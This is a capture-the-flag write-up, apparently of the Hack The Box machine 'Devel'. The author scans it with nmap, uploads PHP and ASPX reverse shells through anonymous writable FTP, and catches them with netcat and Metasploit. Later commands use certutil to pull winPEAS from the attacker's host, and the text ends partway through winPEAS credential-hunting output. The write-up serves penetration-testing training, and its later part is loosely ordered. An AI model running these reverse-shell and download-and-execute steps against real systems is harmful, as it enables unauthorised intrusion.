## Another Day, Another NMAP
```
hippoeug@kali:~$ nmap -sC -sV -A --script=vuln 10.10.10.5 -v -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:20 +0
...
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
80/tcp open  http    Microsoft IIS httpd 7.5
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we know there is a FTP server, and a HTTP server running IIS. Let's KIV.
Also, I wonder what does the vuln script show?
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.5 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:31 +08
NSE: Loaded 105 scripts for scanning.
...
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5
Completed Connect Scan at 23:32, 6.36s elapsed (1000 total ports)
...
PORT   STATE SERVICE
21/tcp open  ftp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|           
|     Disclosure date: 2015-04-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
|_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
```

## First Attack, MS15-034, CVE-2015-1635
Ezgame, another metasploit module!
```
msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump

+] Memory contents:
48 54 54 50 2f 31 2e 31 20 32 30 36 20 50 61 72    |HTTP/1.1 206 Par|
74 69 61 6c 20 43 6f 6e 74 65 6e 74 0d 0a 43 6f    |tial Content..Co|
6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74    |ntent-Type: text|
2f 68 74 6d 6c 0d 0a 4c 61 73 74 2d 4d 6f 64 69    |/html..Last-Modi|
66 69 65 64 3a 20 46 72 69 2c 20 31 37 20 4d 61    |fied: Fri, 17 Ma|
72 20 32 30 31 37 20 31 34 3a 33 37 3a 33 30 20    |r 2017 14:37:30 |
47 4d 54 0d 0a 41 63 63 65 70 74 2d 52 61 6e 67    |GMT..Accept-Rang|
65 73 3a 20 62 79 74 65 73 0d 0a 45 54 61 67 3a    |es: bytes..ETag:|
20 22 33 37 62 35 65 64 31 32 63 39 66 64 32 31    | "37b5ed12c9fd21|
3a 30 22 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63    |:0"..Server: Mic|
72 6f 73 6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a    |rosoft-IIS/7.5..|
58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 41 53    |X-Powered-By: AS|
50 2e 4e 45 54 0d 0a 44 61 74 65 3a 20 4d 6f 6e    |P.NET..Date: Mon|
2c 20 33 30 20 4e 6f 76 20 32 30 32 30 20 32 33    |, 30 Nov 2020 23|
3a 33 39 3a 35 32 20 47 4d 54 0d 0a 43 6f 6e 74    |:39:52 GMT..Cont|
65 6e 74 2d 4c 65 6e 67 74 68 3a 20 36 38 38 0d    |ent-Length: 688.|
0a 43 6f 6e 74 65 6e 74 2d 52 61 6e 67 65 3a 20    |.Content-Range: |
62 79 74 65 73 20 31 2d 36 38 38 2f 36 38 39 0d    |bytes 1-688/689.|
0a 0d 0a 21 44 4f 43 54 59 50 45 20 68 74 6d 6c    |...!DOCTYPE html|
20 50 55 42 4c 49 43 20 22 2d 2f 2f 57 33 43 2f    | PUBLIC "-//W3C/|
2f 44 54 44 20 58 48 54 4d 4c 20 31 2e 30 20 53    |/DTD XHTML 1.0 S|
74 72 69 63 74 2f 2f 45 4e 22 20 22 68 74 74 70    |trict//EN" "http|
3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f 54 52    |://www.w3.org/TR|
2f 78 68 74 6d 6c 31 2f 44 54 44 2f 78 68 74 6d    |/xhtml1/DTD/xhtm|
6c 31 2d 73 74 72 69 63 74 2e 64 74 64 22 3e 0d    |l1-strict.dtd">.|
0a 3c 68 74 6d 6c 20 78 6d 6c 6e 73 3d 22 68 74    |.<html xmlns="ht|
74 70 3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f    |tp://www.w3.org/|
31 39 39 39 2f 78 68 74 6d 6c 22 3e 0d 0a 3c 68    |1999/xhtml">..<h|
65 61 64 3e 0d 0a 3c 6d 65 74 61 20 68 74 74 70    |ead>..<meta http|
2d 65 71 75 69 76 3d 22 43 6f 6e 74 65 6e 74 2d    |-equiv="Content-|
54 79 70 65 22 20 63 6f 6e 74 65 6e 74 3d 22 74    |Type" content="t|
65 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65    |ext/html; charse|
74 3d 69 73 6f 2d 38 38 35 39 2d 31 22 20 2f 3e    |t=iso-8859-1" />|
0d 0a 3c 74 69 74 6c 65 3e 49 49 53 37 3c 2f 74    |..<title>IIS7</t|
69 74 6c 65 3e 0d 0a 3c 73 74 79 6c 65 20 74 79    |itle>..<style ty|
70 65 3d 22 74 65 78 74 2f 63 73 73 22 3e 0d 0a    |pe="text/css">..|
3c 21 2d 2d 0d 0a 62 6f 64 79 20 7b 0d 0a 09 63    |<!--..body {...c|
6f 6c 6f 72 3a 23 30 30 30 30 30 30 3b 0d 0a 09    |olor:#000000;...|
62 61 63 6b 67 72 6f 75 6e 64 2d 63 6f 6c 6f 72    |background-color|
3a 23 42 33 42 33 42 33 3b 0d 0a 09 6d 61 72 67    |:#B3B3B3;...marg|
69 6e 3a 30 3b 0d 0a 7d 0d 0a 0d 0a 23 63 6f 6e    |in:0;..}....#con|
74 61 69 6e 65 72 20 7b 0d 0a 09 6d 61 72 67 69    |tainer {...margi|
6e 2d 6c 65 66 74 3a 61 75 74 6f 3b 0d 0a 09 6d    |n-left:auto;...m|
61 72 67 69 6e 2d 72 69 67 68 74 3a 61 75 74 6f    |argin-right:auto|
3b 0d 0a 09 74 65 78 74 2d 61 6c 69 67 6e 3a 63    |;...text-align:c|
65 6e 74 65 72 3b 0d 0a 09 7d 0d 0a 0d 0a 61 20    |enter;...}....a |
69 6d 67 20 7b 0d 0a 09 62 6f 72 64 65 72 3a 6e    |img {...border:n|
6f 6e 65 3b 0d 0a 7d 0d 0a 0d 0a 2d 2d 3e 0d 0a    |one;..}....-->..|
3c 2f 73 74 79 6c 65 3e 0d 0a 3c 2f 68 65 61 64    |</style>..</head|
3e 0d 0a 3c 62 6f 64 79 3e 0d 0a 3c 64 69 76 20    |>..<body>..<div |
69 64 3d 22 63 6f 6e 74 61 69 6e 65 72 22 3e 0d    |id="container">.|
0a 3c 61 20 68 72 65 66 3d 22 68 74 74 70 3a 2f    |.<a href="http:/|
2f 67 6f 2e 6d 69 63 72 6f 73 6f 66 74 2e 63 6f    |/go.microsoft.co|
6d 2f 66 77 6c 69 6e 6b 2f 3f 6c 69 6e 6b 69 64    |m/fwlink/?linkid|
3d 36 36 31 33 38 26 61 6d 70 3b 63 6c 63 69 64    |=66138&amp;clcid|
3d 30 78 34 30 39 22 3e 3c 69 6d 67 20 73 72 63    |=0x409"><img src|
3d 22 77 65 6c 63 6f 6d 65 2e 70 6e 67 22 20 61    |="welcome.png" a|
6c 74 3d 22 49 49 53 37 22 20 77 69 64 74 68 3d    |lt="IIS7" width=|
22 35 37 31 22 20 68 65 69 67 68 74 3d 22 34 31    |"571" height="41|
31 22 20 2f 3e 3c 2f 61 3e 0d 0a 3c 2f 64 69 76    |1" /></a>..</div|
3e 0d 0a 3c 2f 62 6f 64 79 3e 0d 0a 3c 2f 68 74    |>..</body>..</ht|
6d 6c 3e                                           |ml>|
```
Ah crap, nothing interesting mang. Back to searching for vulnerabilties.

## NMAP, Second Attempt
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.5 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:44 +08
...
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Going to `http://10.10.10.5`, we see the IIS welcome page.
Trying `http://10.10.10.5/iisstart.htm` and `http://10.10.10.5/welcome.png` as seen on the FTP server, we get results! 
So they're indeed connected and linked! FTP could be a good vector to attack from! Let's check the FTP out.

## Finding Vulnerabilties for FTP & IIS
We see FTP on Port 21 has `Anonymous FTP login allowed (FTP code 230)`
```
msf5 > use auxiliary/scanner/ftp/anonymous
...
[+] 10.10.10.5:21         - 10.10.10.5:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
[*] 10.10.10.5:21         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Interesting, `Anonymous READ/WRITE (220 Microsoft FTP Service)`. Let's upload a f*\*ken reverse shell!
But what reverse shell? 

Doing some research (Source: https://www.atlantic.net/what-is-an-iis-server/), we see:
```
Because IIS uses C# and .NET web application frameworks like ASP.NET MVC and Entity Framework; additionally, it integrates with Visual Studio, all of which make it a popular choice for enterprises. Other key advantages are native .NET, ASPX and PHP support for modules and scripts, which allows web developers to create eye-catching, seamlessly designed content to their web creations.
```
Interesting, scripts for `.NET`, `ASPX` and `PHP` is supported. 

## Reverse Shell Upload
We can choose between `.NET`, `ASPX` and `PHP` scripts, but let me first attempt to upload a PHP reverse shell.

PHP reverse shell source: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Upload to FTP source: https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/

```
hippoeug@kali:~$ nc -nvlp 4545
listening on [any] 4545 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.5] 49162
Spawn Shell...
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

hippoeug@kali:~$ ftp 10.10.10.5 21
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:hippoeug): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
12-01-20  08:14PM                 5685 php-reverse-shell.php
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
16393 bytes sent in 0.00 secs (31.0190 MB/s)
ftp> ;s
?Invalid command
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
12-01-20  08:14PM                 5685 php-reverse-shell.php
12-01-20  08:18PM                16393 shell.aspx
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
  
  
 http://10.10.10.5/shell.aspx
 
 
 msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST 10.10.14.10
LHOST => 10.10.14.10
msf5 exploit(multi/handler) > set LPOrT 4545
LPOrT => 4545
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.10:4545 
[*] Command shell session 1 opened (10.10.14.10:4545 -> 10.10.10.5:49163) at 2020-11-28 18:40:59 +0800


msf5 > use post/multi/manage/shell_to_meterpreter

c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          1/12/2020, 7:03:18 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 742 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.526 MB
Virtual Memory: In Use:    521 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.10:4545 
[*] Command shell session 3 opened (10.10.14.10:4545 -> 10.10.10.5:49169) at 2020-11-28 19:34:55 +0800



c:\windows\system32\inetsrv>cd ..
cd ..

c:\Windows\System32>cd ..
cd ..

c:\Windows>cd temp
cd temp

c:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEASx86.exe" winpeas.exe
certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEASx86.exe" winpeas.exe
****  Online  ****
  000000  ...
  073400
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Windows\Temp

01/12/2020  09:34 ��    <DIR>          .
01/12/2020  09:34 ��    <DIR>          ..
17/03/2017  01:10 ��                 0 DMI20C8.tmp
28/12/2017  01:44 ��                 0 DMI4069.tmp
01/12/2020  09:15 ��                 0 FXSAPIDebugLogFile.txt
17/03/2017  05:42 ��             3.942 MpCmdRun.log
17/03/2017  04:32 ��             5.194 MpSigStub.log
18/03/2017  01:04 ��    <DIR>          rad11098.tmp
18/03/2017  01:06 ��    <DIR>          rad18A66.tmp
18/03/2017  01:06 ��    <DIR>          rad3ED74.tmp
18/03/2017  01:06 ��    <DIR>          rad5167A.tmp
18/03/2017  01:02 ��    <DIR>          rad578E0.tmp
18/03/2017  01:02 ��    <DIR>          rad87630.tmp
18/03/2017  01:07 ��    <DIR>          radB60EF.tmp
18/03/2017  01:02 ��    <DIR>          radB7E46.tmp
18/03/2017  12:58 ��    <DIR>          radC91EC.tmp
18/03/2017  01:02 ��    <DIR>          radCC0AF.tmp
18/03/2017  01:00 ��    <DIR>          radCFF96.tmp
17/03/2017  01:12 ��           180.224 TS_91C4.tmp
17/03/2017  01:12 ��           196.608 TS_952F.tmp
17/03/2017  01:12 ��           360.448 TS_95BC.tmp
17/03/2017  01:12 ��           638.976 TS_96C6.tmp
17/03/2017  01:12 ��            98.304 TS_989B.tmp
17/03/2017  01:12 ��            98.304 TS_9909.tmp
17/03/2017  01:12 ��           409.600 TS_99A6.tmp
17/03/2017  01:12 ��           180.224 TS_A0E8.tmp
17/03/2017  01:12 ��           114.688 TS_A57B.tmp
28/12/2017  01:50 ��    <DIR>          vmware-SYSTEM
01/12/2020  08:47 ��            28.104 vmware-vmsvc.log
28/12/2017  02:49 ��             6.807 vmware-vmusr.log
01/12/2020  07:03 ��               376 vmware-vmvss.log
01/12/2020  09:34 ��           472.064 winpeas.exe
01/12/2020  09:15 ��    <DIR>          WPDNSE
              18 File(s)      2.793.863 bytes
              15 Dir(s)  24.608.706.560 bytes free

c:\Windows\Temp>



:\Windows\Temp>certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEAS.bat" winPEAS.bat
certutil.exe -urlcache -split -f "http://10.10.14.10:8000/winPEAS.bat" winPEAS.bat
****  Online  ****
  0000  ...
  8923
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Windows\Temp

01/12/2020  09:50 ��    <DIR>          .
01/12/2020  09:50 ��    <DIR>          ..
17/03/2017  01:10 ��                 0 DMI20C8.tmp
28/12/2017  01:44 ��                 0 DMI4069.tmp
01/12/2020  09:15 ��                 0 FXSAPIDebugLogFile.txt
17/03/2017  05:42 ��             3.942 MpCmdRun.log
17/03/2017  04:32 ��             5.194 MpSigStub.log
01/12/2020  09:40 ��                 0 output.txt
18/03/2017  01:04 ��    <DIR>          rad11098.tmp
18/03/2017  01:06 ��    <DIR>          rad18A66.tmp
18/03/2017  01:06 ��    <DIR>          rad3ED74.tmp
18/03/2017  01:06 ��    <DIR>          rad5167A.tmp
18/03/2017  01:02 ��    <DIR>          rad578E0.tmp
18/03/2017  01:02 ��    <DIR>          rad87630.tmp
18/03/2017  01:07 ��    <DIR>          radB60EF.tmp
18/03/2017  01:02 ��    <DIR>          radB7E46.tmp
18/03/2017  12:58 ��    <DIR>          radC91EC.tmp
18/03/2017  01:02 ��    <DIR>          radCC0AF.tmp
18/03/2017  01:00 ��    <DIR>          radCFF96.tmp
17/03/2017  01:12 ��           180.224 TS_91C4.tmp
17/03/2017  01:12 ��           196.608 TS_952F.tmp
17/03/2017  01:12 ��           360.448 TS_95BC.tmp
17/03/2017  01:12 ��           638.976 TS_96C6.tmp
17/03/2017  01:12 ��            98.304 TS_989B.tmp
17/03/2017  01:12 ��            98.304 TS_9909.tmp
17/03/2017  01:12 ��           409.600 TS_99A6.tmp
17/03/2017  01:12 ��           180.224 TS_A0E8.tmp
17/03/2017  01:12 ��           114.688 TS_A57B.tmp
28/12/2017  01:50 ��    <DIR>          vmware-SYSTEM
01/12/2020  09:18 ��            28.185 vmware-vmsvc.log
28/12/2017  02:49 ��             6.807 vmware-vmusr.log
01/12/2020  07:03 ��               376 vmware-vmvss.log
01/12/2020  09:45 ��           472.064 winpeas
01/12/2020  09:52 ��            35.107 winPEAS.bat
01/12/2020  09:34 ��           472.064 winpeas.exe
01/12/2020  09:15 ��    <DIR>          WPDNSE
              21 File(s)      3.301.115 bytes
              15 Dir(s)  24.603.930.624 bytes free

c:\Windows\Temp>winPEAS.bat
winPEAS.bat

            ((,.,/((((((((((((((((((((/,  */
                                                                                                                                                                      
 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS                                                                                                                  
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                
C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                                                                        
                                                                                                                                                                      
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                            
                                                                                                                                                                      
C:\Windows\ehome\ehRecvr.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
C:\Windows\ehome\ehsched.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe NT SERVICE\TrustedInstaller:(F)                                                                 
                                                                                                                                                                      
C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\infocard.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                                                                      
C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                                
                                                                                                                                                                      
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                             
                                                                                                                                                                      
C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(I)(F)                                                                    
                                                                                                                                                                      
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)                                                                                       
                                                                                                                                                                      
C:\Program Files\Windows Media Player\wmpnetwk.exe NT SERVICE\TrustedInstaller:(F)                                                                                    
                                                                                                                                                                      
                                                                                                                                                                      
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                                                                     
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                
                                                                                                                                                                      
 [+] UNQUOTED SERVICE PATHS                                                                                                                                           
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Progam.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                           
   [i] The permissions are also checked and filtered using icacls                                                                                                     
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                
aspnet_state                                                                                                                                                          
 C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe                                                                                                       
C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                                                                        
                                                                                                                                                                      
clr_optimization_v2.0.50727_32                                                                                                                                        
 C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe                                                                                                           
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)                                                                            
                                                                                                                                                                      
ehRecvr                                                                                                                                                               
 C:\Windows\ehome\ehRecvr.exe                                                                                                                                         
C:\Windows\ehome\ehRecvr.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
ehSched                                                                                                                                                               
 C:\Windows\ehome\ehsched.exe                                                                                                                                         
C:\Windows\ehome\ehsched.exe NT SERVICE\TrustedInstaller:(F)                                                                                                          
                                                                                                                                                                      
FontCache3.0.0.0                                                                                                                                                      
 C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe                                                                                                
C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe NT SERVICE\TrustedInstaller:(F)                                                                 
                                                                                                                                                                      
TrustedInstaller                                                                                                                                                      
 C:\Windows\servicing\TrustedInstaller.exe                                                                                                                            
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                             
                                                                                                                                                                      
                                                                                                                                                                      
[*] DLL HIJACKING in PATHenv variable                                                                                                                                 
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations                                                              
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                                                                       
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking                                                                           
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                                                                                   
                                                                                                                                                                      
C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                                                                            
                                                                                                                                                                      
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                                                                              
                                                                                                                                                                      
                                                                                                                                                                      
[*] CREDENTIALS                                                                                                                                                       
                                                                                                                                                                      
 [+] WINDOWS VAULT                                                                                                                                                    
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault                                                                           
                                                                                                                                                                      
Currently stored credentials:                                                                                                                                         
                                                                                                                                                                      
* NONE *                                                                                                                                                              
                                                                                                                                                                      
                                                                                                                                                                      
 [+] Unattended files                                                                                                                                                 
                                                                                                                                                                      
 [+] SAM and SYSTEM backups                                                                                                                                           
                                                                                                                                                                      
 [+] McAffee SiteList.xml                                                                                                                                             
 Volume in drive C has no label.                                                                                                                                      
 Volume Serial Number is 8620-71F1                                                                                                                                    
C:\Program Files                                                                                                                                                      
 Volume in drive C has no label.                                                                                                                                      
 Volume Serial Number is 8620-71F1                                                                                                                                    
 Volume in drive C has no label.                                                                                                                                      
 Volume Serial Number is 8620-71F1                                                                                                                                    
 Volume in drive C has no label.                                                                                                                                      
 Volume Serial Number is 8620-71F1                                                                                                                                    
                                                                                                                                                                      
C:\Windows\Panther\setupinfo                                                                                                                                          
C:\Windows\System32\inetsrv\appcmd.exe                                                                                                                                
C:\Windows\winsxs\x86_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_10bfc8e81625ecbd\appcmd.exe                                          
C:\inetpub\temp\appPools\Web.config                                                                                                                                   
                                                                                                                                                                      
---                                                                                                                                                                   
Scan complete.                                                                                                                                                        
                                                                                                                                                                      
 [+] GPP Password                                                                                                                                                     
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
 [+] Cloud Credentials                                                                                                                                                
                                                                                                                                                                      
 [+] AppCmd                                                                                                                                                           
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe                                                                              
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                                                                        
                                                                                                                                                                      
 [+] Files in registry that may contain credentials                                                                                                                   
   [i] Searching specific files that may contains credentials.                                                                                                        
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files                                                                
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                                                                     
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                                                                   
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                                                             
    DefaultUserName    REG_SZ    babis                                                                                                                                
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                                                            
                                                                                                                                                                      
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                                                                                  
                                                                                                                                                                      
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                                                                                  
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                                                                        
    FTPSVC    REG_SZ    Software\Microsoft\FTPSVC\CurrentVersion                                                                                                      
                                                                                                                                                                      
Looking inside HKCU\Software\TightVNC\Server                                                                                                                          
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                                                                               
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                                                                       
C:\Windows\Panther\setupinfo                                                                                                                                          
C:\Windows\System32\inetsrv\appcmd.exe                                                                                                                                
C:\Windows\winsxs\x86_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7600.16385_none_10bfc8e81625ecbd\appcmd.exe                                          
C:\inetpub\temp\appPools\Web.config                                                                                                                                   
                                                                                                                                                                      
---                                                                                                                                                                   
Scan complete.                                                                                                                                                        
 [+] DPAPI MASTER KEYS                                                                                                                                                
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                                                                        
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi                                                                                   
 [+] DPAPI MASTER KEYS                                                                                                                                                
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                                                                                   
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module                                                              
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi                                                                                   
                                                                                                                                                                      
Looking inside C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Credentials\                                                                        
                                                                                                                                                                      
                                                                                                                                                                      
Looking inside C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials\                                                                          
                                                                                                                                                                      
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                                                                                   
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                                                                             
    DefaultUserName    REG_SZ    babis                                                                                                                                
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                                                                            
                                                                                                                                                                      
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                                                                                  
                                                                                                                                                                      
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                                                                                  
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                                                                        
    FTPSVC    REG_SZ    Software\Microsoft\FTPSVC\CurrentVersion                                                                                                      
